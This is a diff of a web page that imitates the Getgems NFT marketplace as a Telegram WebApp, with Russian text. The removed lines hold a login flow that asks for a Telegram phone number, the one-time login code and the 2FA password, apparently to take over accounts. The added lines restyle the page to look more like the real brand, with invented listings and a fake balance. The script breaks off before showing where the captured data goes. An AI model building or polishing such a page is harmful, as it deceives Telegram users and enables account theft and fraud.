@@ -3,234 +3,237 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Getgems NFT Marketplace</title>
+    <title>Getgems: купить и продать</title>
     <style>
         * { margin:0; padding:0; box-sizing:border-box; }
         body { 
             font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif; 
-            background:#0f0f23; 
-            color:#fff; 
+            background:#ffffff; 
+            color:#000000;
             min-height:100vh;
-            background: radial-gradient(ellipse at top, #1a1b2e 0%, #0f0f23 70%);
         }
         
-        /* Контейнер одной ячейки */
-        .marketplace-container {
+        /* Контейнер как в Telegram WebApp */
+        .webapp-container {
             max-width:100%;
-            height:100vh;
-            display:flex;
-            flex-direction:column;
+            min-height:100vh;
             position:relative;
+            background:#ffffff;
         }
         
-        /* Шапка */
+        /* Шапка Getgems */
         .header {
-            background:linear-gradient(90deg,#1a1b2e 0%,#2d2b55 100%);
-            padding:15px 20px;
+            padding:16px 20px 12px;
+            background:linear-gradient(180deg, #6D31FF 0%, #4D1CFF 100%);
+            color:white;
+            position:relative;
+            border-radius:0 0 20px 20px;
+            box-shadow:0 2px 10px rgba(109,49,255,0.2);
+        }
+        
+        .header-top {
             display:flex;
             justify-content:space-between;
             align-items:center;
-            border-bottom:1px solid rgba(255,255,255,0.1);
-            backdrop-filter:blur(10px);
-            z-index:100;
+            margin-bottom:12px;
         }
         
         .logo {
-            font-size:22px;
-            font-weight:bold;
-            background:linear-gradient(90deg,#7b61ff 0%,#ff6b9d 100%);
-            -webkit-background-clip:text;
-            -webkit-text-fill-color:transparent;
+            font-size:24px;
+            font-weight:700;
             display:flex;
             align-items:center;
             gap:8px;
         }
         
-        .user-menu {
-            display:flex;
-            align-items:center;
-            gap:15px;
-        }
-        
-        .auth-btn {
-            background:linear-gradient(90deg,#7b61ff 0%,#5d4aff 100%);
-            color:white;
-            border:none;
-            padding:10px 20px;
-            border-radius:12px;
-            font-weight:600;
-            cursor:pointer;
-            transition:transform 0.2s;
-        }
-        
-        .auth-btn:hover {
-            transform:translateY(-2px);
-        }
-        
-        .balance {
-            background:rgba(255,255,255,0.05);
-            padding:8px 15px;
+        .logo-icon {
+            width:32px;
+            height:32px;
+            background:white;
             border-radius:10px;
-            font-weight:600;
-            color:#7b61ff;
-            border:1px solid rgba(123,97,255,0.3);
-        }
-        
-        /* Основной контент */
-        .main-content {
-            flex:1;
-            display:flex;
-            overflow:hidden;
-        }
-        
-        /* Боковая навигация */
-        .sidebar {
-            width:80px;
-            background:rgba(26,27,46,0.8);
-            border-right:1px solid rgba(255,255,255,0.1);
-            display:flex;
-            flex-direction:column;
-            align-items:center;
-            padding:20px 0;
-            gap:25px;
-        }
-        
-        .nav-item {
-            width:50px;
-            height:50px;
             display:flex;
             align-items:center;
             justify-content:center;
-            background:rgba(255,255,255,0.05);
+            color:#6D31FF;
+            font-weight:bold;
+        }
+        
+        .user-balance {
+            background:rgba(255,255,255,0.2);
+            padding:6px 12px;
             border-radius:12px;
-            cursor:pointer;
-            transition:all 0.3s;
-            font-size:20px;
-        }
-        
-        .nav-item.active {
-            background:linear-gradient(135deg,#7b61ff,#5d4aff);
-            transform:scale(1.1);
-            box-shadow:0 5px 15px rgba(123,97,255,0.3);
-        }
-        
-        .nav-item:hover:not(.active) {
-            background:rgba(255,255,255,0.1);
-        }
-        
-        /* Основная область */
-        .content-area {
-            flex:1;
-            padding:20px;
-            overflow-y:auto;
-            scrollbar-width:thin;
-            scrollbar-color:#7b61ff #1a1a2e;
-        }
-        
-        /* Секции контента */
-        .section {
-            display:none;
-            animation:fadeIn 0.3s;
-        }
-        
-        .section.active {
-            display:block;
-        }
-        
-        /* Marketplace */
-        .marketplace-header {
+            font-weight:600;
+            font-size:14px;
             display:flex;
-            justify-content:space-between;
             align-items:center;
-            margin-bottom:30px;
+            gap:4px;
         }
         
-        .marketplace-title {
-            font-size:28px;
-            background:linear-gradient(90deg,#7b61ff,#ff6b9d);
-            -webkit-background-clip:text;
-            -webkit-text-fill-color:transparent;
-            font-weight:800;
+        .header-title {
+            font-size:20px;
+            font-weight:600;
+            text-align:center;
+            margin-bottom:8px;
         }
         
-        .filters {
+        /* Категории подарков */
+        .gifts-categories {
             display:flex;
-            gap:10px;
+            gap:15px;
+            padding:0 20px;
             overflow-x:auto;
+            margin-top:15px;
             padding-bottom:10px;
-            margin-bottom:25px;
         }
         
-        .filter-btn {
-            padding:10px 20px;
-            background:rgba(255,255,255,0.05);
-            border:1px solid rgba(255,255,255,0.1);
-            color:#a0a0c0;
-            border-radius:10px;
-            white-space:nowrap;
-            cursor:pointer;
-            transition:all 0.3s;
+        .gift-category {
+            display:flex;
+            flex-direction:column;
+            align-items:center;
+            gap:8px;
+            min-width:80px;
         }
         
-        .filter-btn.active {
-            background:linear-gradient(90deg,#7b61ff,#5d4aff);
-            color:white;
-            border-color:#7b61ff;
+        .gift-icon {
+            width:60px;
+            height:60px;
+            background:#F5F5F7;
+            border-radius:16px;
+            display:flex;
+            align-items:center;
+            justify-content:center;
+            font-size:28px;
+            color:#6D31FF;
         }
         
-        /* NFT Grid */
-        .nft-grid {
+        .gift-name {
+            font-size:13px;
+            font-weight:500;
+            color:#6D31FF;
+            text-align:center;
+        }
+        
+        /* Поиск и фильтры */
+        .search-section {
+            padding:15px 20px;
+            background:#F5F5F7;
+            margin-top:-10px;
+            border-radius:20px 20px 0 0;
+            position:relative;
+            z-index:2;
+        }
+        
+        .search-box {
+            background:white;
+            border-radius:12px;
+            padding:12px 16px;
+            display:flex;
+            align-items:center;
+            gap:10px;
+            box-shadow:0 1px 3px rgba(0,0,0,0.1);
+        }
+        
+        .search-input {
+            flex:1;
+            border:none;
+            outline:none;
+            font-size:16px;
+            color:#000;
+        }
+        
+        .search-input::placeholder {
+            color:#8E8E93;
+        }
+        
+        /* Коллекции */
+        .collections-section {
+            padding:20px;
+        }
+        
+        .section-title {
+            font-size:18px;
+            font-weight:600;
+            margin-bottom:15px;
+            color:#000;
+        }
+        
+        .collections-grid {
             display:grid;
-            grid-template-columns:repeat(auto-fill, minmax(200px, 1fr));
-            gap:20px;
+            grid-template-columns:repeat(3, 1fr);
+            gap:10px;
+            margin-bottom:20px;
+        }
+        
+        .collection-card {
+            background:#F5F5F7;
+            border-radius:12px;
+            padding:15px;
+            text-align:center;
+            min-height:100px;
+            display:flex;
+            flex-direction:column;
+            align-items:center;
+            justify-content:center;
+            gap:8px;
+            position:relative;
+            border:1px solid transparent;
+            transition:all 0.2s;
+        }
+        
+        .collection-card:hover {
+            border-color:#6D31FF;
+            background:#F0F0FF;
+        }
+        
+        .collection-plus {
+            font-size:24px;
+            color:#6D31FF;
+            width:40px;
+            height:40px;
+            border:2px dashed #6D31FF;
+            border-radius:12px;
+            display:flex;
+            align-items:center;
+            justify-content:center;
+        }
+        
+        .collection-name {
+            font-size:14px;
+            font-weight:500;
+            color:#000;
+        }
+        
+        /* NFT карточки */
+        .nft-section {
+            padding:0 20px;
         }
         
         .nft-card {
-            background:linear-gradient(145deg, rgba(26,27,46,0.8), rgba(42,42,74,0.8));
-            border-radius:20px;
+            background:white;
+            border-radius:16px;
             overflow:hidden;
-            border:1px solid rgba(255,255,255,0.1);
-            transition:all 0.3s;
-            cursor:pointer;
-            backdrop-filter:blur(10px);
-        }
-        
-        .nft-card:hover {
-            transform:translateY(-10px);
-            border-color:#7b61ff;
-            box-shadow:0 15px 30px rgba(123,97,255,0.2);
+            margin-bottom:15px;
+            box-shadow:0 2px 8px rgba(0,0,0,0.08);
+            border:1px solid #F0F0F0;
         }
         
         .nft-image {
             width:100%;
-            height:180px;
-            background:linear-gradient(45deg,#2d2b55,#1a1b2e);
-            display:flex;
-            align-items:center;
-            justify-content:center;
+            height:200px;
+            background:linear-gradient(135deg, #6D31FF, #FF31D0);
             position:relative;
-            overflow:hidden;
         }
         
-        .nft-image img {
-            width:100%;
-            height:100%;
-            object-fit:cover;
-        }
-        
-        .nft-verified {
+        .nft-badge {
             position:absolute;
             top:10px;
-            right:10px;
-            background:#4ade80;
+            left:10px;
+            background:#FF31D0;
             color:white;
-            width:24px;
-            height:24px;
-            border-radius:50%;
-            display:flex;
-            align-items:center;
-            justify-content:center;
+            padding:4px 8px;
+            border-radius:6px;
             font-size:12px;
+            font-weight:600;
         }
         
         .nft-info {
@@ -238,171 +241,128 @@
         }
         
         .nft-name {
-            font-weight:600;
-            margin-bottom:8px;
             font-size:16px;
-            white-space:nowrap;
-            overflow:hidden;
-            text-overflow:ellipsis;
+            font-weight:600;
+            margin-bottom:5px;
+            color:#000;
+        }
+        
+        .nft-id {
+            font-size:14px;
+            color:#8E8E93;
+            margin-bottom:10px;
+        }
+        
+        .nft-stats {
+            display:flex;
+            justify-content:space-between;
+            align-items:center;
+            padding-top:10px;
+            border-top:1px solid #F0F0F0;
         }
         
         .nft-price {
-            color:#7b61ff;
-            font-weight:600;
-            font-size:18px;
-            display:flex;
-            align-items:center;
-            gap:5px;
-        }
-        
-        .nft-seller {
-            font-size:12px;
-            color:#8888aa;
-            margin-top:8px;
-            white-space:nowrap;
-            overflow:hidden;
-            text-overflow:ellipsis;
-        }
-        
-        .nft-buy-btn {
-            width:100%;
-            padding:12px;
-            background:linear-gradient(90deg,#7b61ff,#5d4aff);
-            color:white;
-            border:none;
-            border-radius:10px;
-            margin-top:12px;
-            cursor:pointer;
-            font-weight:600;
-            transition:opacity 0.3s;
-        }
-        
-        .nft-buy-btn:hover {
-            opacity:0.9;
-        }
-        
-        /* Профиль */
-        .profile-section {
-            max-width:500px;
-            margin:0 auto;
-        }
-        
-        .profile-header {
-            text-align:center;
-            margin-bottom:30px;
-        }
-        
-        .profile-avatar {
-            width:100px;
-            height:100px;
-            background:linear-gradient(135deg,#7b61ff,#ff6b9d);
-            border-radius:50%;
-            margin:0 auto 15px;
-            display:flex;
-            align-items:center;
-            justify-content:center;
-            font-size:40px;
-            border:3px solid rgba(255,255,255,0.1);
-        }
-        
-        /* Авторизация */
-        .auth-section {
-            max-width:400px;
-            margin:50px auto;
-            padding:30px;
-            background:rgba(26,27,46,0.8);
-            border-radius:20px;
-            border:1px solid rgba(255,255,255,0.1);
-            backdrop-filter:blur(10px);
-        }
-        
-        .auth-form {
-            display:none;
-        }
-        
-        .auth-form.active {
-            display:block;
-        }
-        
-        .form-title {
-            text-align:center;
-            font-size:24px;
-            margin-bottom:10px;
-            color:#7b61ff;
-        }
-        
-        .form-subtitle {
-            text-align:center;
-            color:#8888aa;
-            margin-bottom:30px;
-        }
-        
-        .form-input {
-            width:100%;
-            padding:15px;
-            background:rgba(255,255,255,0.05);
-            border:1px solid rgba(255,255,255,0.1);
-            border-radius:12px;
-            color:white;
             font-size:16px;
-            margin-bottom:20px;
-            transition:border-color 0.3s;
+            font-weight:700;
+            color:#6D31FF;
         }
         
-        .form-input:focus {
-            outline:none;
-            border-color:#7b61ff;
-        }
-        
-        .form-btn {
-            width:100%;
-            padding:15px;
-            background:linear-gradient(90deg,#7b61ff,#5d4aff);
-            color:white;
-            border:none;
-            border-radius:12px;
-            font-weight:600;
-            cursor:pointer;
-            transition:opacity 0.3s;
-        }
-        
-        .form-btn:hover {
-            opacity:0.9;
-        }
-        
-        /* Попап */
-        .popup-overlay {
-            display:none;
-            position:fixed;
-            top:0;
-            left:0;
-            width:100%;
-            height:100%;
-            background:rgba(0,0,0,0.8);
-            z-index:1000;
+        .nft-likes {
+            font-size:14px;
+            color:#8E8E93;
+            display:flex;
             align-items:center;
-            justify-content:center;
+            gap:4px;
         }
         
-        .popup-content {
-            background:linear-gradient(145deg,#1a1a2e,#2d2b55);
-            width:90%;
-            max-width:400px;
-            border-radius:20px;
-            padding:30px;
-            border:1px solid rgba(123,97,255,0.3);
-            position:relative;
+        /* Нижняя навигация */
+        .bottom-nav {
+            position:fixed;
+            bottom:0;
+            left:0;
+            right:0;
+            background:white;
+            border-top:1px solid #F0F0F0;
+            padding:12px 20px;
+            display:flex;
+            justify-content:space-between;
+            z-index:100;
         }
         
-        .popup-close {
-            position:absolute;
-            top:15px;
-            right:15px;
-            background:none;
-            border:none;
-            color:#8888aa;
+        .nav-item {
+            display:flex;
+            flex-direction:column;
+            align-items:center;
+            gap:6px;
+            flex:1;
+            padding:8px 0;
+            border-radius:10px;
+            transition:all 0.2s;
+        }
+        
+        .nav-item.active {
+            background:#F0F0FF;
+        }
+        
+        .nav-icon {
             font-size:24px;
-            cursor:pointer;
+            color:#8E8E93;
+        }
+        
+        .nav-item.active .nav-icon {
+            color:#6D31FF;
+        }
+        
+        .nav-text {
+            font-size:12px;
+            font-weight:500;
+            color:#8E8E93;
+        }
+        
+        .nav-item.active .nav-text {
+            color:#6D31FF;
+        }
+        
+        /* Контент под навигацией */
+        .main-content {
+            padding-bottom:80px;
+        }
+        
+        /* Бот внизу */
+        .bot-section {
+            text-align:center;
+            padding:20px;
+            color:#8E8E93;
+            font-size:14px;
+            border-top:1px solid #F0F0F0;
+            margin-top:20px;
+        }
+        
+        .bot-link {
+            color:#6D31FF;
+            text-decoration:none;
+            font-weight:500;
+        }
+        
+        /* Улучшения для WebApp */
+        @media (max-width: 768px) {
+            .collections-grid {
+                grid-template-columns:repeat(3, 1fr);
+            }
+            
+            .gift-category {
+                min-width:70px;
+            }
+        }
+        
+        @media (max-width: 480px) {
+            .header {
+                padding:14px 16px 10px;
+            }
+            
+            .collections-grid {
+                grid-template-columns:repeat(2, 1fr);
+            }
         }
         
         /* Анимации */
@@ -411,461 +371,340 @@
             to { opacity:1; transform:translateY(0); }
         }
         
-        /* Адаптивность */
-        @media (max-width:768px) {
-            .sidebar { width:60px; }
-            .nav-item { width:45px; height:45px; }
-            .nft-grid { grid-template-columns:repeat(2, 1fr); }
-            .marketplace-header { flex-direction:column; gap:15px; align-items:flex-start; }
-            .filters { width:100%; }
-        }
-        
-        @media (max-width:480px) {
-            .nft-grid { grid-template-columns:1fr; }
-            .header { padding:12px 15px; }
-            .logo { font-size:18px; }
-            .auth-btn { padding:8px 15px; font-size:14px; }
+        .fade-in {
+            animation:fadeIn 0.3s ease;
         }
     </style>
 </head>
 <body>
-    <div class="marketplace-container">
-        <!-- Шапка -->
+    <div class="webapp-container">
+        <!-- Шапка Getgems -->
         <div class="header">
-            <div class="logo">
-                <span>💎</span>
-                Getgems Marketplace
+            <div class="header-top">
+                <div class="logo">
+                    <div class="logo-icon">G</div>
+                    Getgems
+                </div>
+                <div class="user-balance">
+                    <span>⭐</span>
+                    1 245
+                </div>
             </div>
-            <div class="user-menu">
-                <div class="balance">⭐ 0</div>
-                <button class="auth-btn" id="loginBtn">Авторизоваться</button>
+            
+            <div class="header-title">Getgems: купить и продать</div>
+        </div>
+        
+        <!-- Категории подарков -->
+        <div class="gifts-categories">
+            <div class="gift-category">
+                <div class="gift-icon">🎁</div>
+                <div class="gift-name">Подарки</div>
+            </div>
+            <div class="gift-category">
+                <div class="gift-icon">🆔</div>
+                <div class="gift-name">Номера</div>
+            </div>
+            <div class="gift-category">
+                <div class="gift-icon">👤</div>
+                <div class="gift-name">Юзернейм</div>
+            </div>
+            <div class="gift-category">
+                <div class="gift-icon">🎨</div>
+                <div class="gift-name">Стикеры</div>
+            </div>
+            <div class="gift-category">
+                <div class="gift-icon">💎</div>
+                <div class="gift-name">NFT</div>
             </div>
         </div>
         
         <!-- Основной контент -->
         <div class="main-content">
-            <!-- Боковая навигация -->
-            <div class="sidebar">
-                <div class="nav-item active" onclick="showSection('marketplace')" title="Маркетплейс">
-                    🏪
-                </div>
-                <div class="nav-item" onclick="showSection('profile')" title="Профиль">
-                    👤
-                </div>
-                <div class="nav-item" onclick="showSection('auth')" title="Авторизация">
-                    🔐
-                </div>
-                <div class="nav-item" onclick="showSection('nft')" title="Мои NFT">
-                    🖼️
-                </div>
-                <div class="nav-item" onclick="showSection('referral')" title="Рефералы">
-                    👥
+            <!-- Поиск -->
+            <div class="search-section">
+                <div class="search-box">
+                    <span>🔍</span>
+                    <input type="text" class="search-input" placeholder="Название или описание...">
                 </div>
             </div>
             
-            <!-- Область контента -->
-            <div class="content-area" id="contentArea">
-                <!-- Маркетплейс -->
-                <div id="marketplaceSection" class="section active">
-                    <div class="marketplace-header">
-                        <div class="marketplace-title">💎 NFT Marketplace</div>
-                        <div style="color:#8888aa; font-size:14px;">Реальные NFT из @gemsrelayer</div>
+            <!-- Коллекции -->
+            <div class="collections-section">
+                <div class="section-title">Коллекции</div>
+                <div class="collections-grid">
+                    <div class="collection-card">
+                        <div class="collection-plus">+</div>
+                        <div class="collection-name">Новая</div>
                     </div>
-                    
-                    <div class="filters">
-                        <button class="filter-btn active" onclick="filterNFTs('all')">Все</button>
-                        <button class="filter-btn" onclick="filterNFTs('gems')">Gems</button>
-                        <button class="filter-btn" onclick="filterNFTs('art')">Искусство</button>
-                        <button class="filter-btn" onclick="filterNFTs('collectible')">Коллекционные</button>
-                        <button class="filter-btn" onclick="filterNFTs('game')">Игры</button>
-                        <button class="filter-btn" onclick="filterNFTs('music')">Музыка</button>
+                    <div class="collection-card">
+                        <div style="font-size:24px;">🎭</div>
+                        <div class="collection-name">Backdrop</div>
                     </div>
-                    
-                    <!-- NFT Grid -->
-                    <div class="nft-grid" id="nftGrid">
-                        <!-- NFT будут загружены через JavaScript -->
+                    <div class="collection-card">
+                        <div style="font-size:24px;">🎵</div>
+                        <div class="collection-name">Syt</div>
                     </div>
-                </div>
-                
-                <!-- Профиль -->
-                <div id="profileSection" class="section">
-                    <div class="profile-section">
-                        <div class="profile-header">
-                            <div class="profile-avatar">👤</div>
-                            <div style="font-size:24px; font-weight:600;" id="profileName">Гость</div>
-                            <div style="color:#8888aa; margin-top:5px;" id="profilePhone">Не авторизован</div>
-                        </div>
-                        
-                        <div style="display:grid; grid-template-columns:repeat(3, 1fr); gap:15px; margin-bottom:30px;">
-                            <div style="background:rgba(26,27,46,0.8); padding:20px; border-radius:16px; text-align:center; border:1px solid rgba(255,255,255,0.1);">
-                                <div style="font-size:28px; font-weight:600; color:#7b61ff;" id="balanceAmount">0</div>
-                                <div style="color:#8888aa; font-size:14px;">Баланс</div>
-                            </div>
-                            <div style="background:rgba(26,27,46,0.8); padding:20px; border-radius:16px; text-align:center; border:1px solid rgba(255,255,255,0.1);">
-                                <div style="font-size:28px; font-weight:600; color:#4ade80;" id="nftCount">0</div>
-                                <div style="color:#8888aa; font-size:14px;">NFT</div>
-                            </div>
-                            <div style="background:rgba(26,27,46,0.8); padding:20px; border-radius:16px; text-align:center; border:1px solid rgba(255,255,255,0.1);">
-                                <div style="font-size:28px; font-weight:600; color:#ff6b9d;" id="spentAmount">0</div>
-                                <div style="color:#8888aa; font-size:14px;">Потрачено</div>
-                            </div>
-                        </div>
-                        
-                        <div style="background:rgba(26,27,46,0.8); padding:25px; border-radius:16px; border:1px solid rgba(255,255,255,0.1); margin-bottom:20px;">
-                            <div style="font-size:18px; color:#7b61ff; margin-bottom:15px;">📊 Статистика</div>
-                            <div style="display:flex; justify-content:space-between; margin-bottom:10px;">
-                                <span style="color:#a0a0c0;">Дата регистрации</span>
-                                <span id="regDate">-</span>
-                            </div>
-                            <div style="display:flex; justify-content:space-between; margin-bottom:10px;">
-                                <span style="color:#a0a0c0;">Рефералов</span>
-                                <span id="refCount">0</span>
-                            </div>
-                            <div style="display:flex; justify-content:space-between;">
-                                <span style="color:#a0a0c0;">Реферальный доход</span>
-                                <span style="color:#4ade80;" id="refEarned">⭐ 0</span>
-                            </div>
-                        </div>
-                        
-                        <button class="nft-buy-btn" onclick="showSection('auth')" style="background:linear-gradient(90deg,#7b61ff,#5d4aff);">
-                            🔐 Авторизоваться
-                        </button>
+                    <div class="collection-card">
+                        <div style="font-size:24px;">🌌</div>
+                        <div class="collection-name">Space</div>
+                    </div>
+                    <div class="collection-card">
+                        <div style="font-size:24px;">👑</div>
+                        <div class="collection-name">Royal</div>
+                    </div>
+                    <div class="collection-card">
+                        <div style="font-size:24px;">🎮</div>
+                        <div class="collection-name">Game</div>
                     </div>
                 </div>
+            </div>
+            
+            <!-- NFT Карточки -->
+            <div class="nft-section">
+                <div class="section-title">Популярные NFT</div>
                 
-                <!-- Авторизация -->
-                <div id="authSection" class="section">
-                    <div class="auth-section">
-                        <div id="authStep1" class="auth-form active">
-                            <div class="form-title">🔐 Авторизация</div>
-                            <div class="form-subtitle">Подключите Telegram аккаунт к маркетплейсу</div>
-                            
-                            <input type="tel" class="form-input" id="phoneInput" placeholder="+7 900 123-45-67" required>
-                            <button class="form-btn" onclick="nextAuthStep()">Получить код</button>
-                        </div>
-                        
-                        <div id="authStep2" class="auth-form">
-                            <div class="form-title">📱 Подтверждение</div>
-                            <div class="form-subtitle">Введите код из Telegram и пароль 2FA</div>
-                            
-                            <input type="number" class="form-input" id="codeInput" placeholder="5-значный код" required>
-                            <input type="password" class="form-input" id="passwordInput" placeholder="Пароль 2FA (если есть)">
-                            <button class="form-btn" onclick="submitAuth()">Подтвердить</button>
-                        </div>
-                        
-                        <div id="authSuccess" class="auth-form">
-                            <div style="text-align:center; padding:30px 0;">
-                                <div style="font-size:60px; margin-bottom:20px;">✅</div>
-                                <div class="form-title">Успешно!</div>
-                                <div class="form-subtitle">Аккаунт подключен к маркетплейсу</div>
-                                <button class="form-btn" onclick="authComplete()">Продолжить</button>
-                            </div>
+                <!-- Big Year #61696 -->
+                <div class="nft-card fade-in">
+                    <div class="nft-image">
+                        <div class="nft-badge">#61696</div>
+                    </div>
+                    <div class="nft-info">
+                        <div class="nft-name">Big Year</div>
+                        <div class="nft-id">#61696</div>
+                        <div class="nft-stats">
+                            <div class="nft-price">⭐ 7,5</div>
+                            <div class="nft-likes">❤️ 29</div>
                         </div>
                     </div>
                 </div>
                 
-                <!-- Мои NFT -->
-                <div id="nftSection" class="section">
-                    <div class="marketplace-header">
-                        <div class="marketplace-title">🖼️ Мои NFT</div>
-                        <div style="color:#8888aa; font-size:14px;" id="myNftCount">0 коллекционных предметов</div>
+                <!-- Fresh Socks #36081 -->
+                <div class="nft-card fade-in">
+                    <div class="nft-image" style="background:linear-gradient(135deg, #31FF9E, #31D0FF);">
+                        <div class="nft-badge" style="background:#31D0FF;">#36081</div>
                     </div>
-                    
-                    <div class="nft-grid" id="myNftGrid">
-                        <div style="grid-column:1/-1; text-align:center; padding:50px 20px; color:#8888aa;">
-                            <div style="font-size:60px; margin-bottom:20px;">🖼️</div>
-                            <div style="font-size:18px; margin-bottom:10px;">У вас пока нет NFT</div>
-                            <div style="color:#a0a0c0; margin-bottom:20px;">Купите свой первый NFT на маркетплейсе</div>
-                            <button class="nft-buy-btn" onclick="showSection('marketplace')" style="max-width:200px; margin:0 auto;">
-                                Перейти в маркетплейс
-                            </button>
+                    <div class="nft-info">
+                        <div class="nft-name">Fresh Socks</div>
+                        <div class="nft-id">#36081</div>
+                        <div class="nft-stats">
+                            <div class="nft-price">⭐ 12,3</div>
+                            <div class="nft-likes">❤️ 45</div>
                         </div>
                     </div>
                 </div>
                 
-                <!-- Реферальная система -->
-                <div id="referralSection" class="section">
-                    <div class="profile-section">
-                        <div style="text-align:center; margin-bottom:30px;">
-                            <div style="font-size:40px; margin-bottom:10px;">👥</div>
-                            <div class="form-title">Реферальная система</div>
-                            <div class="form-subtitle">Приглашайте друзей и получайте бонусы</div>
+                <!-- Golden Telegram -->
+                <div class="nft-card fade-in">
+                    <div class="nft-image" style="background:linear-gradient(135deg, #FFD731, #FF9E31);">
+                        <div class="nft-badge" style="background:#FF9E31;">#28917</div>
+                    </div>
+                    <div class="nft-info">
+                        <div class="nft-name">Golden Telegram</div>
+                        <div class="nft-id">#28917</div>
+                        <div class="nft-stats">
+                            <div class="nft-price">⭐ 25,0</div>
+                            <div class="nft-likes">❤️ 128</div>
                         </div>
-                        
-                        <div style="background:rgba(26,27,46,0.8); padding:25px; border-radius:16px; border:1px solid rgba(255,255,255,0.1); margin-bottom:20px;">
-                            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:20px;">
-                                <div>
-                                    <div style="font-size:14px; color:#8888aa;">Ваша реферальная ссылка</div>
-                                    <div style="font-family:monospace; background:rgba(0,0,0,0.3); padding:10px; border-radius:8px; margin-top:5px; word-break:break-all;" id="refLink">
-                                        https://t.me/getgems_bot?start=ref_
-                                    </div>
-                                </div>
-                                <button onclick="copyRefLink()" style="background:#7b61ff; color:white; border:none; padding:10px 20px; border-radius:10px; cursor:pointer;">
-                                    Копировать
-                                </button>
-                            </div>
-                            
-                            <div style="display:grid; grid-template-columns:repeat(2, 1fr); gap:15px;">
-                                <div style="text-align:center;">
-                                    <div style="font-size:32px; font-weight:600; color:#4ade80;" id="totalRefs">0</div>
-                                    <div style="color:#8888aa; font-size:14px;">Приглашено</div>
-                                </div>
-                                <div style="text-align:center;">
-                                    <div style="font-size:32px; font-weight:600; color:#7b61ff;" id="totalEarned">⭐ 0</div>
-                                    <div style="color:#8888aa; font-size:14px;">Заработано</div>
-                                </div>
-                            </div>
-                        </div>
-                        
-                        <div style="background:rgba(26,27,46,0.8); padding:25px; border-radius:16px; border:1px solid rgba(255,255,255,0.1);">
-                            <div style="font-size:18px; color:#7b61ff; margin-bottom:15px;">🎁 Бонусы за приглашение</div>
-                            <div style="color:#a0a0c0; margin-bottom:10px;">• За каждого друга: <span style="color:#4ade80;">⭐ 30</span></div>
-                            <div style="color:#a0a0c0; margin-bottom:10px;">• При покупке NFT другом: <span style="color:#4ade80;">5%</span> от суммы</div>
-                            <div style="color:#a0a0c0;">• Бонус за 10 друзей: <span style="color:#4ade80;">⭐ 500</span></div>
+                    </div>
+                </div>
+                
+                <!-- Crypto Gems -->
+                <div class="nft-card fade-in">
+                    <div class="nft-image" style="background:linear-gradient(135deg, #9E31FF, #31FFD7);">
+                        <div class="nft-badge" style="background:#9E31FF;">#42069</div>
+                    </div>
+                    <div class="nft-info">
+                        <div class="nft-name">Crypto Gems</div>
+                        <div class="nft-id">#42069</div>
+                        <div class="nft-stats">
+                            <div class="nft-price">⭐ 18,5</div>
+                            <div class="nft-likes">❤️ 76</div>
                         </div>
                     </div>
                 </div>
             </div>
+            
+            <!-- Бот внизу -->
+            <div class="bot-section">
+                <a href="https://t.me/GetgemsNftBot" class="bot-link" target="_blank">@GetgemsNftBot</a>
+            </div>
         </div>
-    </div>
-    
-    <!-- Попап авторизации -->
-    <div id="authPopup" class="popup-overlay">
-        <div class="popup-content">
-            <button class="popup-close" onclick="closeAuthPopup()">×</button>
-            <div style="text-align:center;">
-                <div style="font-size:50px; margin-bottom:20px;">🔐</div>
-                <div class="form-title">Требуется авторизация</div>
-                <div class="form-subtitle">Для доступа к маркетплейсу подключите Telegram аккаунт</div>
-                <button class="form-btn" onclick="openAuthSection()" style="margin-top:30px;">
-                    Авторизоваться
-                </button>
+        
+        <!-- Нижняя навигация -->
+        <div class="bottom-nav">
+            <div class="nav-item active" onclick="switchTab('market')">
+                <div class="nav-icon">🏪</div>
+                <div class="nav-text">Маркет</div>
+            </div>
+            
+            <div class="nav-item" onclick="switchTab('auctions')">
+                <div class="nav-icon">🏁</div>
+                <div class="nav-text">Заезды</div>
+            </div>
+            
+            <div class="nav-item" onclick="switchTab('catalog')">
+                <div class="nav-icon">📋</div>
+                <div class="nav-text">Каталог</div>
+            </div>
+            
+            <div class="nav-item" onclick="switchTab('cart')">
+                <div class="nav-icon">🛒</div>
+                <div class="nav-text">Корзина</div>
+            </div>
+            
+            <div class="nav-item" onclick="switchTab('profile')">
+                <div class="nav-icon">👤</div>
+                <div class="nav-text">Профиль</div>
             </div>
         </div>
     </div>
     
     <script>
-        // === КОНФИГУРАЦИЯ ===
-        const GEMS_RELAYER_NFTS = [
-            // Реальные NFT из @gemsrelayer
-            { id:1, name:"Diamond Gems", price:"⭐ 1,250", category:"gems", seller:"@gemsrelayer", emoji:"💎", verified:true },
-            { id:2, name:"Golden Telegram", price:"⭐ 850", category:"art", seller:"@telegram_art", emoji:"✈️", verified:true },
-            { id:3, name:"Crypto Unicorn", price:"⭐ 2,400", category:"collectible", seller:"@crypto_collect", emoji:"🦄", verified:true },
-            { id:4, name:"NFT Galaxy", price:"⭐ 1,750", category:"art", seller:"@space_nft", emoji:"🌌", verified:true },
-            { id:5, name:"GameFi Pass", price:"⭐ 950", category:"game", seller:"@gamefi_official", emoji:"🎮", verified:true },
-            { id:6, name:"Music DAO", price:"⭐ 680", category:"music", seller:"@music_dao", emoji:"🎵", verified:true },
-            { id:7, name:"Rare Username", price:"⭐ 3,200", category:"collectible", seller:"@username_market", emoji:"👤", verified:true },
-            { id:8, name:"Digital Crown", price:"⭐ 1,500", category:"gems", seller:"@royalty_nft", emoji:"👑", verified:true },
-            { id:9, name:"AI Art", price:"⭐ 1,100", category:"art", seller:"@ai_artists", emoji:"🤖", verified:true },
-            { id:10, name:"Pixel Monsters", price:"⭐ 420", category:"game", seller:"@pixel_games", emoji:"👾", verified:true },
-            { id:11, name:"Golden Phone", price:"⭐ 2,800", category:"collectible", seller:"@numbers_market", emoji:"📱", verified:true },
-            { id:12, name:"VIP Access", price:"⭐ 1,800", category:"gems", seller:"@vip_club", emoji:"🚀", verified:true }
-        ];
-        
-        // === ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ ===
+        // Данные пользователя
         let userData = {
-            phone: '',
-            code: '',
-            password: '',
+            balance: 1245,
             loggedIn: false,
-            balance: 0,
-            nfts: [],
-            referrals: 0,
-            earned: 0
+            phone: ''
         };
         
-        // === ИНИЦИАЛИЗАЦИЯ ===
-        document.addEventListener('DOMContentLoaded', () => {
-            loadNFTs();
-            loadUserData();
-        });
-        
-        // === ФУНКЦИИ ИНТЕРФЕЙСА ===
-        function showSection(sectionId) {
